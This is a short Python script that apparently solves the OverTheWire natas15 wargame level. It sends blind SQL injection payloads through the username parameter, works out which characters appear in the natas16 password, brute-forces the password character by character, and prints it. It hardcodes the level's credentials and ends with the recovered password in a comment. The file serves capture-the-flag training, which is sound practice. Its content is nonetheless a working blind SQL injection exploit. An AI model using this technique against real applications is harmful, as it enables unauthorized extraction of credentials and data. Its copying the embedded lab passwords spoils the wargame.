#!/bin/python

import requests, string

url = "http://natas15.natas.labs.overthewire.org/index.php"
user = "natas15"
passw = "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J"


# Find chars that are part of the password
all_chars = ''.join([string.ascii_letters, string.digits])

passw_dict = []
test_str = "This user exists."
for c in all_chars:
	full_url = ''.join([url, '?username=natas16"+and+password+LIKE+BINARY+"%', c, '%&debug' ])	
	r = requests.get(full_url, auth=(user, passw))

	if test_str in r.content:
		passw_dict.append(c)
		print ("Password Dictionary: {0}").format(''.join(passw_dict))

print ("Dictionary complete")
print ("Dictionary: {0}").format(''.join(passw_dict))



# Bruteforce password based on found chars
final_passw = ''

for i in range(32):
	for c in passw_dict:
		test = final_passw+c
		full_url = ''.join([url, '?username=natas16"+and+password+LIKE+BINARY+"', test + '%&debug' 	])
		r = requests.get(full_url, auth=(user,passw))

		if test_str in r.content:
			final_passw = final_passw+c
			print ("Length: {0}, Password: {1}").format(len(final_passw), final_passw)
			break

print ("Final password is {0}").format(final_passw)

# WaIHEacj63wnNIBROHeqi3p9t0m5nhmh